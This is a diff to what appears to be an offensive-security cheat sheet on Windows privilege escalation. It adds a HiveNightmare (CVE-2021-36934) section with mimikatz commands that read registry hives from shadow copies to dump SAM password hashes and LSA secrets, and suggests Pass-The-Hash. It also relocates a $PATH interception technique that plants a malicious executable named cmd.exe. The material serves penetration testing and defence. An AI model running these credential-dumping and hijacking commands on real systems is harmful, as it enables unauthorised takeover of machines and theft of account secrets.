@@ -14,6 +14,7 @@
     * [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
     * [SAM and SYSTEM files](#sam-and-system-files)
+    * [HiveNightmare](#hivenightmare)
     * [Search for file contents](#search-for-file-contents)
     * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
     * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
@@ -28,6 +29,7 @@
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
 * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
 * [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)
+* [EoP - $PATH Interception](#eop---path-interception)
 * [EoP - Named Pipes](#eop---named-pipes)
 * [EoP - Kernel Exploitation](#eop---kernel-exploitation)
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
@@ -384,7 +386,37 @@ pwdump SYSTEM SAM > /root/sam.txt
 samdump2 SYSTEM SAM -o sam.txt
 ```
 
-Then crack it with `john -format=NT /root/sam.txt`.
+Either crack it with `john -format=NT /root/sam.txt` or use Pass-The-Hash.
+
+
+### HiveNightmare
+
+> CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user
+
+Check for the vulnerability using `icacls`
+
+```powershell
+C:\Windows\System32> icacls config\SAM
+config\SAM BUILTIN\Administrators:(I)(F)
+           NT AUTHORITY\SYSTEM:(I)(F)
+           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!
+```
+
+Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.
+
+```powershell
+mimikatz> token::whoami /full
+
+# List shadow copies available
+mimikatz> misc::shadowcopies
+
+# Extract account from SAM databases
+mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+
+# Extract secrets from SECURITY
+mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
+```
+
 
 ### Search for file contents
 
@@ -793,6 +825,30 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
 - `C:\Program.exe`
 - `C:\Program Files.exe`
+
+
+## EoP - $PATH Interception
+
+Requirements:
+- PATH contains a writeable folder with low privileges.
+- The writeable folder is _before_ the folder that contains the legitimate binary.
+
+EXAMPLE:
+```powershell
+# List contents of the PATH environment variable
+# EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
+$env:Path
+
+# See permissions of the target folder
+# EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
+icacls.exe "C:\Program Files\nodejs\"
+
+# Place our evil-file in that folder.
+copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
+```
+
+Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. 
+
 
 ## EoP - Named Pipes
 
@@ -1256,28 +1312,6 @@ Failing on :
 
 Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
 
-
-## EoP - $PATH Interception
-
-Requirements:
-- PATH contains a writeable folder with low privileges.
-- The writeable folder is _before_ the folder that contains the legitimate binary.
-
-EXAMPLE:
-```
-//(Powershell) List contents of the PATH environment variable
-//EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
-$env:Path
-
-//See permissions of the target folder
-//EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
-icacls.exe "C:\Program Files\nodejs\"
-
-//Place our evil-file in that folder.
-copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
-```
-
-Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. 
 
 ## References
 
